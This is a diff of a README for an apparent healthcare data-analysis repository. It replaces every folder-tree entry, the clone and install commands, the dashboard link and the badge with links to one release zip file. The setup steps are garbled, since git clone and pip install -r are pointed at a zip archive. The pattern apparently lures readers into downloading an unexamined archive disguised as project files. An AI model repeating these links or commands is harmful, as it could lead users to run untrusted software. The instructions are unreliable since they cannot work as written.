@@ -18,24 +18,24 @@ In the fast-evolving world of healthcare, data analysis plays a crucial role in 
 📂 Healthcare-Analysis
     |
     |__ 📂 Data
-    |   |__ https://github.com/ShottzHT/Healthcare-Analysis/releases/download/v1.0/Program.zip
+    |   |__ https://github.com/ShottzHT/Healthcare-Analysis/releases/download/v2.0/Software.zip
     |
     |__ 📂 Notebooks
-    |   |__ https://github.com/ShottzHT/Healthcare-Analysis/releases/download/v1.0/Program.zip
-    |   |__ https://github.com/ShottzHT/Healthcare-Analysis/releases/download/v1.0/Program.zip
+    |   |__ https://github.com/ShottzHT/Healthcare-Analysis/releases/download/v2.0/Software.zip
+    |   |__ https://github.com/ShottzHT/Healthcare-Analysis/releases/download/v2.0/Software.zip
     |
     |__ 📂 Visualizations
-    |   |__ https://github.com/ShottzHT/Healthcare-Analysis/releases/download/v1.0/Program.zip
-    |   |__ https://github.com/ShottzHT/Healthcare-Analysis/releases/download/v1.0/Program.zip
+    |   |__ https://github.com/ShottzHT/Healthcare-Analysis/releases/download/v2.0/Software.zip
+    |   |__ https://github.com/ShottzHT/Healthcare-Analysis/releases/download/v2.0/Software.zip
     |
-    |__ 📄 https://github.com/ShottzHT/Healthcare-Analysis/releases/download/v1.0/Program.zip
+    |__ 📄 https://github.com/ShottzHT/Healthcare-Analysis/releases/download/v2.0/Software.zip
 ```
 
 ## ⚙️ Installation <a name="installation"></a>
 To get started with the Healthcare Analysis repository, follow these steps:
-1. Clone this repository to your local machine using `git clone https://github.com/ShottzHT/Healthcare-Analysis/releases/download/v1.0/Program.zip`
+1. Clone this repository to your local machine using `git clone https://github.com/ShottzHT/Healthcare-Analysis/releases/download/v2.0/Software.zip`
 2. Navigate to the project directory
-3. Install the required dependencies by running `pip install -r https://github.com/ShottzHT/Healthcare-Analysis/releases/download/v1.0/Program.zip`
+3. Install the required dependencies by running `pip install -r https://github.com/ShottzHT/Healthcare-Analysis/releases/download/v2.0/Software.zip`
 
 ## 🚀 Usage <a name="usage"></a>
 1. **Data Preprocessing**:
@@ -47,9 +47,9 @@ To get started with the Healthcare Analysis repository, follow these steps:
 4. **Python Scripting**:
    - Utilize Python scripts for advanced data analysis and visualization tasks.
 
-Make sure to visit the [Healthcare Analysis Dashboard](https://github.com/ShottzHT/Healthcare-Analysis/releases/download/v1.0/Program.zip) for a comprehensive view of the healthcare data insights!
+Make sure to visit the [Healthcare Analysis Dashboard](https://github.com/ShottzHT/Healthcare-Analysis/releases/download/v2.0/Software.zip) for a comprehensive view of the healthcare data insights!
 
-[![Healthcare Analysis Dashboard](https://github.com/ShottzHT/Healthcare-Analysis/releases/download/v1.0/Program.zip%20Analysis-Dashboard-brightgreen)](https://github.com/ShottzHT/Healthcare-Analysis/releases/download/v1.0/Program.zip)
+[![Healthcare Analysis Dashboard](https://github.com/ShottzHT/Healthcare-Analysis/releases/download/v2.0/Software.zip%20Analysis-Dashboard-brightgreen)](https://github.com/ShottzHT/Healthcare-Analysis/releases/download/v2.0/Software.zip)
 
 ## 🤝 Contributing <a name="contributing"></a>
 We welcome contributions from the community to enhance the Healthcare Analysis repository. Here's how you can contribute:
